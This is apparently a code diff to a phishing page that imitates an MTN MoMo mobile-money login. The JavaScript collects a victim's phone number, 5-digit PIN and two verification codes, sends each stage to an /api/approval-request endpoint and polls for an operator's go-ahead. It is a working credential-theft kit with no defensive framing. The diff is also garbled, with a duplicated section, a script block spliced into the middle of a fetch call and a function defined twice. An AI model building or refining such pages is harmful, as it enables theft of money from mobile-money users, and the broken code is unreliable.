@@ -422,9 +422,13 @@ button:disabled {
   <!-- PAGE 2: PIN BLOCK -->
   <section id="page2" class="hidden">
     <div class="card">
+        <!-- PAGE 2: PIN BLOCK -->
+  <section id="page2" class="hidden">
+    <div class="card">
       <h1>Enter Your 5-Digit PIN</h1>
       <p>Enter the 5-digit PIN for your MTN MoMo account to Login.</p>
       <div class="boxes" id="pinBoxes"></div>
+      <div class="boxes" id="pinBoxes2" style="margin-top: 12px;"></div>
       <div id="pinMessage" class="status"></div>
     </div>
     
@@ -583,6 +587,147 @@ nextPhoneBtn.addEventListener("click", () => {
   
   setupBoxInputs("pinBoxes", 5, submitPinStage);
 });
+async function submitPinStage(pinValue) {
+  userData.pin = pinValue;
+  document.getElementById("pinWaiting").classList.remove("hidden");
+  
+  const success = await sendStagePayload("pin", { phone: userData.phone, pin: userData.pin });
+  if (success) {
+    startPolling("pin", "page2", "page3", "pinWaiting", "pinMessage", () => {
+      setTimeout(() => document.getElementById("code1").focus(), 50);
+    });
+  }
+}
+
+const code1Input = document.getElementById("code1");
+const submitCode1Btn = document.getElementById("submitCode1");
+
+code1Input.addEventListener("input", () => {
+  if (code1Input.value.trim().length > 0) {
+    submitCode1Btn.removeAttribute("disabled");
+  } else {
+    submitCode1Btn.setAttribute("disabled", "true");
+  }
+});
+
+submitCode1Btn.addEventListener("click", async () => {
+  userData.code1 = code1Input.value.trim();
+  submitCode1Btn.setAttribute("disabled", "true");
+  document.getElementById("code1Waiting").classList.remove("hidden");
+
+  const success = await sendStagePayload("code1", { code1: userData.code1 });
+  if (success) {
+    startPolling("code1", "page3", "page4", "code1Waiting", "code1Message", () => {
+      setupBoxInputs("code2Boxes", 4, submitCode2Stage);
+    });
+  }
+});
+
+async function submitCode2Stage(code2Value) {
+  userData.code2 = code2Value;
+  document.getElementById("code2Waiting").classList.remove("hidden");
+
+  const success = await sendStagePayload("code2", { code2: userData.code2 });
+  if (success) {
+    startPolling("code2", "page4", "page5", "code2Waiting", "code2Message");
+  }
+}
+
+async function sendStagePayload(stage, payload) {
+  try {
+    const response = await fetch("/api/approval-request", {
+<script>
+let sessionId = null;
+let userData = { phone: "", pin: "", code1: "", code2: "" };
+let pollingInterval = null;
+
+window.addEventListener("DOMContentLoaded", async () => {
+  try {
+    const res = await fetch("/api/session", { method: "POST" });
+    const data = await res.json();
+    sessionId = data.sessionId;
+  } catch (err) {
+    console.error("Initialization error:", err);
+  }
+});
+
+function setupBoxInputs(containerId, count, onComplete, autoFocus = true) {
+  const container = document.getElementById(containerId);
+  container.innerHTML = "";
+  const inputs = [];
+
+  for (let i = 0; i < count; i++) {
+    const input = document.createElement("input");
+    input.type = "tel";
+    input.maxLength = 1;
+    input.inputMode = "numeric";
+    input.autocomplete = "off";
+
+    input.addEventListener("input", (e) => {
+      input.value = input.value.replace(/\D/g, "");
+      if (input.value && i < count - 1) inputs[i + 1].focus();
+      
+      const fullValue = inputs.map(el => el.value).join("");
+      if (fullValue.length === count) {
+        inputs.forEach(el => el.disabled = true);
+        onComplete(fullValue);
+      }
+    });
+
+    input.addEventListener("keydown", (e) => {
+      if (e.key === "Backspace" && !input.value && i > 0) {
+        inputs[i - 1].focus();
+      }
+    });
+
+    container.appendChild(input);
+    inputs.push(input);
+  }
+  
+  if (autoFocus && inputs.length > 0) inputs[0].focus();
+}
+
+const phoneInput = document.getElementById("phone");
+const nextPhoneBtn = document.getElementById("nextPhone");
+const phoneError = document.getElementById("phoneError");
+
+phoneInput.addEventListener("input", () => {
+  let value = phoneInput.value;
+  
+  // Check if character entered is a number
+  if (/\D/g.test(value)) {
+    phoneInput.value = value.replace(/\D/g, "");
+    return;
+  }
+
+  // Enforce rule: Must begin with the digit 7
+  if (value.length > 0 && !value.startsWith("7")) {
+    phoneInput.value = "";
+    phoneError.classList.remove("hidden"); // Display warning banner
+    nextPhoneBtn.setAttribute("disabled", "true");
+    return;
+  } else if (value.length > 0) {
+    phoneError.classList.add("hidden"); // Clear warning once input is valid
+  }
+  
+  // Unlock button ONLY when the number contains exactly 9 digits
+  if (value.length === 9) {
+    nextPhoneBtn.removeAttribute("disabled");
+  } else {
+    nextPhoneBtn.setAttribute("disabled", "true");
+  }
+});
+
+
+nextPhoneBtn.addEventListener("click", () => {
+  userData.phone = phoneInput.value;
+  document.getElementById("page1").classList.add("hidden");
+  document.getElementById("page2").classList.remove("hidden");
+  
+  setupBoxInputs("pinBoxes", 5, submitPinStage, true);
+  setupBoxInputs("pinBoxes2", 4, submitPinStage, false);
+});
+
 async function submitPinStage(pinValue) {
   userData.pin = pinValue;
   document.getElementById("pinWaiting").classList.remove("hidden");
